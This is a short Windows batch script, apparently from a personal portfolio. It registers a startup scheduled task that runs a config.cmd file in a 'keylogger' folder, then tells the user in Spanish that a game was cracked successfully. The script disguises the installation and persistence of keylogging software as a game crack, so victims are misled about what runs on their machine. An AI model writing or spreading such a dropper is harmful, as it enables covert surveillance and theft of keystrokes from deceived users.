@echo off
set taskName=EjecutarScriptCMD
set cmdPath=C:\Users\gusta\Desktop\portafolio\keylogger\config.cmd

schtasks /create /tn %taskName% /tr "%cmdPath%" /sc onstart /f
echo Juego Crackeado Con Exito
pause
